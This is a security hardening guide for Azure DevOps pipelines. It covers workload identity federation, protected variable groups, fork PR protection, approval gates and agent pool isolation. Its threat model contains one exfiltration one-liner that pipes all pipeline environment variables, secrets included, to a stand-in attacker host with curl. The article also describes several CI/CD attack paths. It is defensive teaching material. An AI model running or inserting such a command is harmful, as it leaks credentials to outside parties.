---
title: "Azure DevOps and Azure Pipelines Security Hardening"
description: "Azure Pipelines service connections hold keys to every environment the pipeline deploys to. Overpermissive service principals, classic pipeline authoring without audit trail, variable groups readable by any pipeline, and pull request builds running untrusted contributor code are the most common attack paths. This article covers YAML pipelines, service connection scoping, workload identity federation, protected resources, agent pool isolation, and branch policy enforcement."
slug: azure-devops-pipeline-security
date: 2026-05-07
lastmod: 2026-05-07
category: cicd
tags:
  - azure-devops
  - azure-pipelines
  - service-connections
  - oidc
  - pipeline-security
personas:
  - security-engineer
  - platform-engineer
article_number: 517
difficulty: Advanced
estimated_reading_time: 13
published: true
layout: article.njk
permalink: /articles/cicd/azure-devops-pipeline-security/
---

# Azure DevOps and Azure Pipelines Security Hardening

## Problem

Azure DevOps is Microsoft's hosted CI/CD platform, integrating source control (Azure Repos), pipelines (Azure Pipelines), artefact management (Azure Artifacts), and work tracking in a single tenant. The pipeline engine is powerful and deeply integrated with Azure Resource Manager, Azure Kubernetes Service, and the broader Azure ecosystem — which makes it a high-value target.

Common security failures in Azure Pipelines deployments:

- **Classic pipelines without version history.** Classic (GUI-defined) pipelines are configured through the web UI. Changes are not tracked in source control, making it impossible to audit who changed a pipeline step to exfiltrate secrets. Classic pipelines also lack several security controls available only in YAML.
- **Overpermissive service connections.** A service connection is the bridge between a pipeline and an Azure subscription, Azure Container Registry, Kubernetes cluster, or external system. Service connections created with the default "Contributor at subscription scope" give any pipeline that can use the connection full write access to the entire Azure subscription.
- **Service connections using long-lived client secret credentials.** By default, many service connections are backed by an Azure AD service principal with a client secret. The secret is stored in Azure DevOps, not rotated automatically, and used for every job that references the connection.
- **Variable groups not protected.** Variable groups hold secrets (API keys, connection strings, passwords) used across multiple pipelines. An unprotected variable group is accessible by any pipeline in the project — including pipelines created by any developer.
- **Pull request builds running untrusted contributor code.** Pipelines triggered by pull requests from forked repositories or from external contributors run the modified pipeline YAML from the PR. Without fork build protection, a contributor can modify `azure-pipelines.yml` to exfiltrate secrets from the pipeline environment.
- **No approval gates on environments.** Azure Pipelines Environments define deployment targets (Kubernetes namespaces, virtual machines). Without approval requirements, a pipeline can deploy to production automatically without human review.
- **Agent pools shared across security boundaries.** Self-hosted agent pools are shared between development, staging, and production pipelines by default. A job running in a development pipeline on a shared agent can read environment variables or workspace artefacts left by a production deployment job.

**Target systems:** Azure DevOps Services (cloud-hosted); Azure DevOps Server 2022+; Azure Pipelines YAML v1 schema; Azure AD Workload Identity Federation; Microsoft-hosted and self-hosted agent pools.

## Threat Model

- **Adversary 1 — Variable group exfiltration:** A developer creates a new pipeline and references a variable group that stores production database credentials. Because the group is not marked as a protected resource requiring authorization, the pipeline runs and the developer's script executes `env | curl -X POST attacker.com --data-binary @-`, extracting all secrets.
- **Adversary 2 — Overpermissive service connection abuse:** An attacker with developer-level project access creates a pipeline that uses the existing `production-azure` service connection, which was granted Contributor at subscription scope. The pipeline uses the connection to create a new admin user in Azure AD or exfiltrate storage account keys across the subscription.
- **Adversary 3 — Fork pull request secret theft:** A contributor forks the repository and opens a pull request modifying `azure-pipelines.yml` to print all pipeline variables to the build log. Because the pipeline is configured to run on all pull requests including from forks, secrets from the variable group are exposed.
- **Adversary 4 — Classic pipeline tampering without audit trail:** An attacker with Build Administrator role modifies a classic pipeline's deploy step to inject a malicious command. Because classic pipelines are not in source control, there is no diff or pull request — the change takes effect immediately on the next run.
- **Adversary 5 — Agent pool lateral movement:** A pipeline job for a development workload runs on a self-hosted agent shared with production pipelines. The development job reads `~/.azure`, cached credentials from the MSAL token cache, or pipeline workspace directories containing artefacts from a previous production job.
- **Access level:** Adversaries 1 and 2 need contributor (developer) role at the project level. Adversary 3 needs the ability to fork. Adversary 4 needs Build Administrator role. Adversary 5 exploits shared agent infrastructure.
- **Objective:** Extract credentials for Azure resources; run code in production environments; escalate access within the Azure tenant.
- **Blast radius:** A service connection with Contributor on the subscription is equivalent to full write access to all resources in the subscription — VMs, databases, Key Vaults (where the pipeline itself lacks data-plane access, but can reconfigure access policies), and AKS clusters.

## Configuration

### Step 1: Migrate to YAML Pipelines and Require YAML Approval

YAML pipelines store the pipeline definition in the repository. Every change goes through pull request, code review, and branch policy. Disable classic pipeline creation at the organization level:

```
Azure DevOps Organization Settings → Pipelines → Settings:
  ☑ Disable creation of classic build pipelines
  ☑ Disable creation of classic release pipelines
```

Enforce this programmatically via the Azure DevOps REST API:

```bash
# Disable classic pipeline creation for the organization.
ORG="https://dev.azure.com/my-org"
PAT="$(cat ~/.ado-admin-pat)"

curl -s -u ":${PAT}" \
  -X PATCH \
  -H "Content-Type: application/json" \
  --data '{"enforceSettableVar": true, "disableClassicPipelineCreation": true}' \
  "${ORG}/_apis/build/generalSettings?api-version=7.1-preview.1"
```

A hardened YAML pipeline skeleton with the minimum required security settings:

```yaml
# azure-pipelines.yml — hardened skeleton.

trigger:
  branches:
    include:
      - main
  paths:
    exclude:
      - docs/**
      - "*.md"

# Disable fork PR builds by default.
# PR builds from forks require explicit fork protection settings (Step 4).
pr:
  branches:
    include:
      - main

pool:
  # Use named pool — do NOT use the default pool.
  # The named pool is scoped to production deployments only.
  name: production-agents

variables:
  - group: my-app-production-vars   # Protected variable group (Step 3).

stages:
  - stage: Build
    jobs:
      - job: BuildAndTest
        steps:
          - checkout: self
            persistCredentials: false   # Do not persist git credentials past checkout.
            clean: true                 # Clean workspace before checkout.

          - task: DotNetCoreCLI@2
            displayName: Build
            inputs:
              command: build
              projects: '**/*.csproj'

  - stage: Deploy
    dependsOn: Build
    condition: and(succeeded(), eq(variables['Build.SourceBranch'], 'refs/heads/main'))
    jobs:
      - deployment: DeployToProduction
        environment: production          # Protected environment with approval gate (Step 5).
        strategy:
          runOnce:
            deploy:
              steps:
                - task: AzureCLI@2
                  displayName: Deploy
                  inputs:
                    azureSubscription: 'production-workload-identity'  # OIDC connection (Step 2).
                    scriptType: bash
                    scriptLocation: inlineScript
                    inlineScript: |
                      az webapp deployment source config-zip \
                        --resource-group my-rg \
                        --name my-webapp \
                        --src $(Pipeline.Workspace)/drop/app.zip
```

### Step 2: Service Connection Security — Workload Identity Federation

Replace service principal client secrets with workload identity federation (OIDC). There are no secrets to rotate, store, or leak:

```bash
# Create a managed identity in Azure (user-assigned).
az identity create \
  --name ado-production-deployer \
  --resource-group pipeline-identities-rg

IDENTITY_CLIENT_ID=$(az identity show \
  --name ado-production-deployer \
  --resource-group pipeline-identities-rg \
  --query clientId -o tsv)

IDENTITY_PRINCIPAL_ID=$(az identity show \
  --name ado-production-deployer \
  --resource-group pipeline-identities-rg \
  --query principalId -o tsv)

# Assign only the permissions the pipeline needs.
# Scope to the specific resource group, not the subscription.
az role assignment create \
  --assignee "$IDENTITY_PRINCIPAL_ID" \
  --role "Website Contributor" \
  --scope "/subscriptions/SUBSCRIPTION_ID/resourceGroups/production-rg"
```

Configure the federated credential in Azure AD to trust Azure DevOps:

```bash
# Create federated credential on the managed identity.
# The subject format is enforced by Azure DevOps.
az identity federated-credential create \
  --name ado-pipeline-trust \
  --identity-name ado-production-deployer \
  --resource-group pipeline-identities-rg \
  --issuer "https://vstoken.dev.azure.com/YOUR_ORG_ID" \
  --subject "sc://my-org/my-project/production-workload-identity" \
  --audience "api://AzureADTokenExchange"
```

Create the service connection in Azure DevOps pointing to this identity (no client secret):

```bash
# Via Azure DevOps REST API — create workload identity service connection.
# This can also be done through the UI:
# Project Settings → Service connections → New service connection →
#   Azure Resource Manager → Workload Identity Federation (manual)

curl -s -u ":${PAT}" \
  -X POST \
  -H "Content-Type: application/json" \
  --data @- "${ORG}/my-project/_apis/serviceendpoint/endpoints?api-version=7.1" <<'EOF'
{
  "name": "production-workload-identity",
  "type": "AzureRM",
  "authorization": {
    "scheme": "WorkloadIdentityFederation",
    "parameters": {
      "tenantid": "YOUR_TENANT_ID",
      "serviceprincipalid": "YOUR_MANAGED_IDENTITY_CLIENT_ID"
    }
  },
  "data": {
    "subscriptionId": "YOUR_SUBSCRIPTION_ID",
    "subscriptionName": "Production",
    "resourceGroupFilter": "production-rg"
  }
}
EOF
```

Service connection permission matrix:

| Connection | Scope | Role | Used by |
|------------|-------|------|---------|
| `production-workload-identity` | `production-rg` resource group | Website Contributor | Production deploy pipeline only |
| `staging-workload-identity` | `staging-rg` resource group | Contributor | Staging deploy pipeline |
| `acr-push` | Azure Container Registry | AcrPush | Build pipeline (image push) |
| `acr-pull` | Azure Container Registry | AcrPull | All pipelines (image pull) |

Never grant `Contributor` or `Owner` at subscription scope. Always scope to the minimum resource group, resource, or specific role the pipeline action requires.

### Step 3: Protected Variable Groups Linked to Key Vault

Store secrets in Azure Key Vault and link variable groups to the vault — secrets are fetched at runtime and never stored in Azure DevOps:

```bash
# Create the Key Vault (or use an existing one).
az keyvault create \
  --name my-pipeline-kv \
  --resource-group secrets-rg \
  --sku standard \
  --enable-purge-protection true \
  --retention-days 90

# Grant the managed identity read access to secrets (not keys, not certificates).
az keyvault set-policy \
  --name my-pipeline-kv \
  --object-id "$IDENTITY_PRINCIPAL_ID" \
  --secret-permissions get list

# Do NOT grant set/delete to pipeline identities.
# Pipelines should read secrets, not write them.
```

Configure the variable group in Azure DevOps to link to Key Vault:

```
Project Settings → Pipelines → Library → + Variable group:
  Variable group name: my-app-production-vars
  Link secrets from an Azure key vault as variables: ON
  Azure subscription: production-workload-identity
  Key vault name: my-pipeline-kv
  Add variables: DATABASE_CONNECTION_STRING, API_KEY, SMTP_PASSWORD

  Pipeline permissions:
    ☑ Restrict access — only pipelines explicitly approved can use this group
```

Mark the variable group as a **protected resource**. This means that when a pipeline not already authorized attempts to use the group, a manual authorization by a Project Administrator is required.

For secrets that cannot be moved to Key Vault immediately, use variable-level security:

```yaml
# azure-pipelines.yml — reference secret variable; never echo it.
variables:
  - group: my-app-production-vars
  - name: BUILD_CONFIG
    value: Release

steps:
  - script: |
      # Correct: use the variable in a context where it cannot be printed.
      echo "Connecting to database..."
      dotnet ef database update
    env:
      # Inject secret as environment variable — masked in pipeline logs.
      ConnectionStrings__Default: $(DATABASE_CONNECTION_STRING)
    displayName: Run migrations

  # WRONG — never do this:
  # - script: echo "Connection string is $(DATABASE_CONNECTION_STRING)"
```

### Step 4: Fork Build Protection

Prevent pull request builds from forks from accessing secrets:

```
Project Settings → Pipelines → Settings:
  Fork builds:
    ☑ Limit variables for builds from forks
    ☑ Do not make secrets available to builds from forks
    Comment required: Require a team member's comment before building a pull request
```

Additional protection in pipeline YAML:

```yaml
# azure-pipelines.yml — explicit guards on secret-consuming jobs.

jobs:
  - job: Build
    # Allow this to run on fork PRs (no secrets needed).
    steps:
      - script: dotnet build

  - job: IntegrationTest
    # ONLY run integration tests on non-fork PRs and internal branches.
    condition: |
      and(
        succeeded(),
        or(
          eq(variables['Build.Reason'], 'IndividualCI'),
          and(
            eq(variables['Build.Reason'], 'PullRequest'),
            eq(variables['System.PullRequest.IsFork'], 'False')
          )
        )
      )
    variables:
      - group: my-app-staging-vars    # Secret group — only used when not a fork.
    steps:
      - script: dotnet test --category Integration
        env:
          TEST_DATABASE: $(STAGING_DATABASE_URL)
```

The condition `eq(variables['System.PullRequest.IsFork'], 'False')` prevents any fork-originated PR from running jobs that have access to the variable group, even if the fork PR somehow triggered the pipeline.

### Step 5: Protected Environments with Approval Gates

Environments in Azure Pipelines define deployment targets and carry security controls independent of the pipeline YAML:

```
Pipelines → Environments → production → Approvals and checks:
  + Add check → Approvals:
    Approvers: [security-team@example.com, platform-lead@example.com]
    Instructions: "Confirm deployment has passed staging validation and is within change window."
    Allow approvers to approve their own runs: No
    Timeout: 24 hours

  + Add check → Branch control:
    Allowed branches: refs/heads/main
    Verify branch protection: Yes
    (Pipelines must come from main branch; feature branches cannot deploy to production)

  + Add check → Business hours:
    Time zone: UTC
    Allowed Monday-Friday 09:00-17:00
    (Prevents off-hours production deployments without emergency override)
```

The environment-level branch control check is enforced server-side by Azure DevOps, independent of what the pipeline YAML says. A pipeline that claims to be deploying from `main` but is not actually running from a ref that matches `refs/heads/main` is rejected.

Kubernetes environment targets with resource-scoped service accounts:

```yaml
# azure-pipelines.yml — deploy to Kubernetes environment.
- stage: DeployToAKS
  jobs:
    - deployment: K8sDeploy
      environment: 'production.default'   # Environment "production", namespace "default".
      strategy:
        runOnce:
          deploy:
            steps:
              - task: KubernetesManifest@1
                inputs:
                  action: deploy
                  connectionType: azureResourceManager
                  azureSubscriptionConnection: production-workload-identity
                  azureResourceGroup: production-rg
                  kubernetesCluster: my-aks-cluster
                  namespace: production
                  manifests: $(Pipeline.Workspace)/manifests/*.yaml
```

### Step 6: Agent Pool Security

Microsoft-hosted agents are ephemeral — each job gets a fresh VM, which is destroyed afterwards. Use Microsoft-hosted agents for builds that do not require access to internal network resources.

For self-hosted agents, enforce isolation by security boundary:

```
Organization Settings → Agent pools:
  Create separate pools:
    - production-agents    (access: production pipelines only)
    - staging-agents       (access: staging pipelines only)
    - build-agents         (access: all pipelines for build/test; no deployment secrets)
```

Self-hosted agent hardening:

```bash
# Run the agent as a dedicated low-privilege service account.
# Linux: create a dedicated user with no sudo.
useradd --system --no-create-home --shell /usr/sbin/nologin ado-agent

# Run the agent service as ado-agent.
sudo ./svc.sh install ado-agent
sudo ./svc.sh start

# Restrict the agent's home directory.
chown -R ado-agent:ado-agent /opt/ado-agent
chmod 750 /opt/ado-agent

# Prevent agents from persisting credentials across jobs.
# In the agent's .env file:
echo "AGENT_TOOLSDIRECTORY=/opt/ado-agent-tools" >> /opt/ado-agent/.env
```

```yaml
# In azure-pipelines.yml — demand the specific pool for each stage.
stages:
  - stage: Build
    pool:
      name: build-agents    # General build pool; no deployment credentials.
    jobs:
      - job: Build
        steps:
          - script: make build

  - stage: Deploy
    pool:
      name: production-agents    # Dedicated production pool.
    jobs:
      - deployment: Deploy
        environment: production
        # ...
```

Agent pool permission configuration (enforce via REST API or UI):

```bash
# Restrict production-agents pool: only specific pipelines can use it.
# In Azure DevOps UI:
# Organization Settings → Agent pools → production-agents → Security:
#   Remove "All Pipelines" permission
#   Add only: my-project/production-deploy-pipeline

# Verify pool security via REST API:
curl -s -u ":${PAT}" \
  "${ORG}/_apis/distributedtask/pools?poolName=production-agents&api-version=7.1" | \
  jq '.value[] | {id, name, isHosted, autoProvision}'
```

### Step 7: Branch Policies and Build Validation

Branch policies in Azure Repos enforce code review and build gates before any commit reaches the protected branch:

```
Azure Repos → Branches → main → Branch policies:
  Require a minimum number of reviewers: 2
    ☑ Prohibit the most recent pusher from approving their own changes
    ☑ Reset all approval votes when new changes are pushed
    ☑ Allow completion when approvers vote "Approve with suggestions"

  Check for linked work items: Required

  Check for comment resolution: Required

  Limit merge types:
    ☑ Squash merge (only)
    ☐ Allow merge commits
    ☐ Allow rebase

  Build validation:
    + Add build policy → select: my-app-pr-validation
      Trigger: Automatic
      Policy requirement: Required
      Build expiration: Immediately when main is updated
      Display name: PR Validation Build
```

The build validation policy runs the pipeline on every PR. The pipeline should run unit tests, SAST, and security scans — but must NOT have access to production secrets. Use a separate pipeline definition for PR validation:

```yaml
# azure-pipelines-pr.yml — PR validation pipeline (no secrets).
# This file is specified in the Build Validation policy.

trigger: none   # Not triggered by pushes; only by PR policy.

pr:
  branches:
    include:
      - main

pool:
  name: build-agents    # Build pool only — no production credentials.

steps:
  - checkout: self
    clean: true

  - task: DotNetCoreCLI@2
    displayName: Restore
    inputs:
      command: restore

  - task: DotNetCoreCLI@2
    displayName: Build
    inputs:
      command: build
      arguments: '--no-restore --configuration Release'

  - task: DotNetCoreCLI@2
    displayName: Unit Tests
    inputs:
      command: test
      arguments: '--no-build --filter "Category=Unit"'

  # SAST scan — runs on PR code before merge.
  - task: CredScan@3
    displayName: Credential Scan

  - task: Semmle@1
    displayName: CodeQL Analysis
    inputs:
      language: csharp

  # No deployment tasks. No variable groups with secrets.
  # No service connections with resource access.
```

### Step 8: Pipeline Permissions and Audit Logs

Restrict which pipelines can use each protected resource (service connection, variable group, environment, agent pool). Use the "Pipeline permissions" control on each resource:

```
Project Settings → Service connections → production-workload-identity → Security:
  Pipeline permissions:
    ☑ Restrict access to specific pipelines
    Allowed pipelines: my-project/production-deploy (pipeline ID: 42)

  User permissions:
    Project Administrators: Administrator
    Developers: User (can view; cannot use in new pipelines without authorization)
    Build Service (my-project): User
```

The same restriction applies to variable groups, environments, and agent pools. An unauthorized pipeline attempting to use a protected resource triggers an authorization request that must be approved by a Project Administrator.

Enable audit logging and ship it to your SIEM:

```bash
# Azure DevOps audit logs via REST API.
curl -s -u ":${PAT}" \
  "${ORG}/_apis/audit/auditlog?api-version=7.1-preview.1&startTime=$(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ)" | \
  jq '.decoratedAuditLogEntries[] | {timestamp: .timestamp, actionId: .actionId, actorDisplayName: .actorDisplayName, data: .data}'
```

Key audit events to monitor:

| Audit event | Security significance |
|-------------|----------------------|
| `Build.RequestedBy` on a protected pipeline | Who triggered a production deployment |
| `ServiceEndpoint.Modified` | Service connection credentials changed |
| `Group.UpdateGroupMembership` | Privilege escalation via group membership |
| `Pipeline.ResourceAuthorized` | Pipeline granted access to a protected resource |
| `Release.DeploymentApproved` | Deployment gate bypassed or approved |
| `Permissions.PermissionUpdated` | Direct permission grant to a user |

Forward audit logs to Azure Monitor:

```bash
# Configure Azure DevOps audit streaming to Azure Monitor Log Analytics.
curl -s -u ":${PAT}" \
  -X POST \
  -H "Content-Type: application/json" \
  --data '{
    "consumerType": "AzureMonitorLogs",
    "consumerInputs": {
      "WorkspaceId": "YOUR_LOG_ANALYTICS_WORKSPACE_ID",
      "SharedKey": "YOUR_WORKSPACE_KEY"
    }
  }' \
  "${ORG}/_apis/audit/streams?api-version=7.1-preview.1"
```

### Step 9: Telemetry

```
azure_devops_pipeline_run_duration_seconds{project, pipeline, result}   histogram
azure_devops_pipeline_run_total{project, pipeline, reason, result}      counter
azure_devops_service_connection_usage_total{connection, pipeline}       counter
azure_devops_environment_deployment_total{environment, pipeline, result} counter
azure_devops_variable_group_access_total{group, pipeline}               counter
azure_devops_agent_pool_queue_seconds{pool}                             histogram
azure_devops_audit_event_total{action_id, actor}                        counter
```

Alert on:

- Any deployment to the `production` environment from a branch other than `main` — branch policy bypass attempt.
- `ServiceEndpoint.Modified` audit event — service connection credentials changed outside of change management process.
- `Pipeline.ResourceAuthorized` outside business hours — unauthorized pipeline gaining access to protected resource.
- Variable group access from a pipeline not in the authorization list — possible new pipeline attempting to access secrets.
- Production agent pool used by a pipeline in the development project — cross-project agent pool access.
- Deployment approved by the same person who requested it — approval gate bypass.

## Expected Behaviour

| Signal | Default Azure Pipelines | Hardened Azure Pipelines |
|--------|------------------------|--------------------------|
| Developer creates pipeline using production service connection | Connection auto-authorized for new pipeline | Protected resource; requires Project Admin authorization |
| Fork PR runs pipeline with secret variable group | Secrets injected into fork PR build | Secrets blocked from fork PRs; `System.PullRequest.IsFork == True` guard skips secret jobs |
| Classic pipeline modified by build admin | Change takes effect immediately; no audit trail | Classic pipelines disabled organization-wide; all changes via PR |
| Service connection backed by client secret | Secret stored in Azure DevOps; no automatic rotation | Workload identity federation; no secret stored; OIDC token per job |
| Production deployment from feature branch | Allowed if pipeline YAML permits | Environment branch control check rejects non-`main` deployments server-side |
| Development pipeline runs on production agent | Shared pool accessible to all pipelines | Production pool restricted to specific pipeline IDs only |

## Trade-offs

| Aspect | Benefit | Cost | Mitigation |
|--------|---------|------|------------|
| Workload identity federation | No client secrets to rotate or leak | Requires Azure AD managed identity setup per environment | One-time Terraform module; reuse across pipelines |
| Protected resources (variable groups, service connections) | Any new pipeline must be explicitly authorized | Project Admin bottleneck for legitimate new pipelines | Use self-service authorization for non-production resources; protect only production |
| Separate PR validation pipeline | PR builds cannot access production secrets | Duplicate pipeline definition to maintain | Shared YAML template file; PR pipeline includes build template |
| Microsoft-hosted agents for builds | Ephemeral environment; no cross-job contamination | No access to internal network resources (private registries, private clusters) | Use self-hosted agents with network access for internal resources; use hosted agents for public builds |
| Environment approval gates | Human review of every production deployment | Deployment velocity reduced | Use business-hours check to gate normal deployments; keep emergency bypass procedure |

## Failure Modes

| Failure | Symptom | Detection | Recovery |
|---------|---------|-----------|----------|
| Workload identity federation misconfigured | Pipeline fails with `AADSTS70021` (no matching federated credential) | Pipeline log shows AAD error; no resource access | Verify `--subject` in federated credential matches ADO service connection name format; check issuer URL |
| Protected environment approval timeout | Deployment stuck waiting for approval | Environment deployment shows "Waiting for approval" | Approvers receive email; approve or reject via Azure DevOps UI or API |
| Fork PR guard condition incorrect | Integration test job runs on fork PR with secrets | Secret group access log shows fork pipeline access | Fix condition expression; verify `System.PullRequest.IsFork` variable value |
| Branch policy build validation blocks all PRs | All PRs blocked because validation pipeline fails | Build validation shows failed status on every PR | Investigate failing test; use "optional" policy temporarily while fixing; do not disable branch protection |
| Self-hosted agent runs as root | Pipeline jobs have excessive host access | Security scan detects root-owned process | Recreate agent service under dedicated low-privilege account; re-register agent |
| Service connection scope too broad | Pipeline can modify resources beyond its intended target | Azure Policy deny audit events; unexpected Resource Graph changes | Remove Contributor assignment; re-create service connection with resource-group-scoped role |

## Related Articles

- [OIDC Federation Hardening for CI-to-Cloud](/articles/cicd/oidc-federation-hardening/)
- [GitLab CI Security](/articles/cicd/gitlab-ci-security/)
- [Jenkins Security Hardening](/articles/cicd/jenkins-security-hardening/)
- [CI/CD Secret Management](/articles/cicd/cicd-secret-management/)
- [Securing CI/CD Runners](/articles/cicd/securing-cicd-runners/)
